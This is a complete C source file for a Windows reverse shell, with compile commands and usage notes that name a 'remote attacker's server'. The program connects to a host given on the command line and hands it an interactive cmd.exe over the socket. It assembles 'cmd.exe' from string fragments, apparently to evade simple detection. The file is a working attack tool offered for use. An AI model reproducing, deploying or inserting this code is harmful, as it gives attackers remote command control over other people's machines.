/*
 * Shamefully simple reverse shell, totally not OPSEC-safe, proving extremely
 * low programming skills. Coded up in couple of minutes.
 *
 * Compilation:
 * - x64
 *      $ x86_64-w64-mingw32-gcc revshell.c -ffunction-sections -fdata-sections -s -Os -o revshell.exe -Wl,--gc-sections -lws2_32
 * - x86
 *      $ i686-w64-mingw32-gcc revshell.c -ffunction-sections -fdata-sections -s -Os -o revshell.exe -Wl,--gc-sections -lws2_32 
 *
 * Usage:
 *      cmd> revshell <IP> <PORT> &
 *
 * Where:
 *   - ip - remote attacker's server IP
 *   - port - remote attacker's server PORT
**/

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <stdio.h>

#ifdef _MSC_VER
#   pragma comment(lib, "ws2_32")
#endif

int main(int argc, char *argv[]) 
{
    WSADATA             wsaData;
    SOCKET              wsock;
    struct sockaddr_in  sin;
    char                saddr[16];

    if (argc < 3)
    {
        return 0;
    }

    const char *hostname = argv[1];
    unsigned int port = atoi(argv[2]);

    WSAStartup(MAKEWORD(2,2), &wsaData);
    wsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    struct hostent *host = gethostbyname(hostname);
    strcpy(saddr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(saddr);
    
    WSAConnect(wsock, (SOCKADDR*)&sin, sizeof(sin), NULL, NULL, NULL, NULL);
    if (WSAGetLastError() == 0) 
    {
        STARTUPINFO sinfo = {0};
        PROCESS_INFORMATION procinfo = {0};
    
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = STARTF_USESTDHANDLES;
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)wsock;

        char *cmd[4] = { "cm", "d.e", "x", "e" };
        char command[8] = "";
        snprintf(command, sizeof(command), "%s%s%s%s", cmd[0], cmd[1], cmd[2], cmd[3]);

        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &procinfo);
    }    

    return 0;
}

